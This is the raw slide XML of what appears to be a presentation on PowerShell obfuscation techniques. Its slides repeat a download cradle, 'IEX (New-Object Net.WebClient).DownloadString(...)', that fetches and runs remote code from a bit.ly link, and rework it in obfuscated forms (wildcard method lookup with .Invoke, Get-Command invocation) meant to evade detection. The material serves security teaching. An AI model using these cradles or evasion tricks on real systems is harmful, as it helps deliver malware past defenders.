                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> | Where-Object {$_.Name -like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>wn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*d*g</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'}).Name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="43088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200" dirty="0" smtClean="0"/>
              <a:t>IEX (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/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559" y="4395259"/>
            <a:ext cx="11224879" cy="426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15571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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Method Obfuscation – Alternate syntax to obtain method name as a String</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="110799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200" dirty="0" smtClean="0"/>
              <a:t>IEX (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(((</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> | Where-Object {$_.Name -like '*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>wn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*d*g'}).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Name)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.Invoke</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200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83546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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> Obfuscation – Alternate syntax to obtain &amp; invoke </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> object</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="110799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200" dirty="0" smtClean="0"/>
              <a:t>IEX (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>).(((</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> | Where-Object {$_.Name -like '*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>wn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>*d*g'}).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Name).Invoke(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')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1132723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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> Obfuscation – Alternate syntax to obtain &amp; invoke </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> object</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean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 smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Get-Command New-Object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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="110799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200" dirty="0" smtClean="0"/>
              <a:t>IEX (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>).(((</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> | Where-Object {$_.Name -like '*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>wn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>*d*g'}).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Name).Invoke(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200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0104" y="4162765"/>
            <a:ext cx="5651790" cy="1803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55373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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> Obfuscation – Alternate syntax to obtain &amp; invoke </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> object</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean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 smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Get-Command New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="110799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200" dirty="0" smtClean="0"/>
              <a:t>IEX (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>).(((</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> | Where-Object {$_.Name -like '*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>wn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>*d*g'}).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Name).Invoke(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200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0765" y="4162765"/>
            <a:ext cx="7150467" cy="160028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17121" y="4584876"/>
            <a:ext cx="9069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.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Up Arrow 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="1069024" y="4004429"/>
            <a:ext cx="261688" cy="697086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23581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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> Obfuscation – Alternate syntax to obtain &amp; invoke </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> object</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean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 smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Get-Command </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object)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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="110799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200" dirty="0" smtClean="0"/>
              <a:t>IEX (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>).(((</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> | Where-Object {$_.Name -like '*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>wn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>*d*g'}).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Name).Invoke(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200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7578" y="4707398"/>
            <a:ext cx="10058400" cy="377051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11" name="Up Arrow 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="2115792" y="3941657"/>
            <a:ext cx="352341" cy="765741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2586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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> Obfuscation – Alternate syntax to obtain &amp; invoke </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> object</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean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 smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>COMMAND </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object)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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="110799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200" dirty="0" smtClean="0"/>
              <a:t>IEX (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>).(((</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> | Where-Object {$_.Name -like '*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>wn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>*d*g'}).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Name).Invoke(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200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7578" y="4707398"/>
            <a:ext cx="10058400" cy="377051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4254545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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> Obfuscation – Alternate syntax to obtain &amp; invoke </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> object</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean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 smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.(COMMAND</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="110799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200" dirty="0" smtClean="0"/>
